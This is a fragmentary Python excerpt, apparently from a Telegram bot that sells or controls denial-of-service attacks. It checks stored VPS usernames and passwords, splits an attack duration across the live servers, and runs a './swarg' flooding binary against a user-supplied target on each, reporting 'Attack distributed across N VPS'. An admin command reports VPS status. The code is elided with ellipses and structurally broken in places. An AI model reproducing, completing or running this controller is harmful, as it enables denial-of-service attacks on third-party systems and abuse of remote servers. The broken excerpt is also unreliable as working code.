        ...
        if len(command) == 4:  
            ...
            if time > 181:
                ...
                for vps in VPS_CREDENTIALS:
                    if check_vps_status(vps["ip"], vps["username"], vps["password"]):
                        active_vps.append(vps)

                if not active_vps:
                    response = "All VPS are currently unreachable. Try again later."
                else:
                    distributed_time = max(1, time // len(active_vps))
                    for vps in active_vps:
                        command_to_run = f"./swarg {king} {soulking} {distributed_time} 100"
                        run_command_on_vps(vps["ip"], vps["username"], vps["password"], command_to_run)
                    response = f"Attack distributed across {len(active_vps)} VPS successfully."
        else:
...
while True:
    try:
        ...
        bot.reply_to(message, "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣")

@bot.message_handler(commands=['vpsstatus'])
def check_all_vps_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        status_report = "🖥 VPS Status Report:\n\n"
        for vps in VPS_CREDENTIALS:
            status = "✅ Online" if check_vps_status(vps["ip"], vps["username"], vps["password"]) else "❌ Offline"
